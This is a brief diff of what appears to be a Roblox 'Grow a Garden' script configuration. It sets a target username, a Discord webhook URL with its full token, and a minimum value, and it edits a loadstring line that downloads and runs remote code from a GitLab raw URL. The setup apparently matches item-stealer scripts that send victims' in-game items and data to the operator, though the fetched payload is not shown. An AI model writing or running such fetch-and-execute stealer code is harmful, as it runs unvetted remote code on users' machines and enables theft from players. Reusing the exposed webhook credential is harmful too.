@@ -2,5 +2,4 @@ Username = "tuanproand"
 Webhook ="https://discord.com/api/webhooks/1404409397316161596/dx4JaVddf9RPdxmiz7gDdJP1Y4F8gAbz045MMAgQR11Eo_C7sBYgpG7xpnjkgwVOmGHL"
 Minimum value = 1
 
-
-loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/maine/grow-a-garden"))()
+loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/grow-a-garden"))()
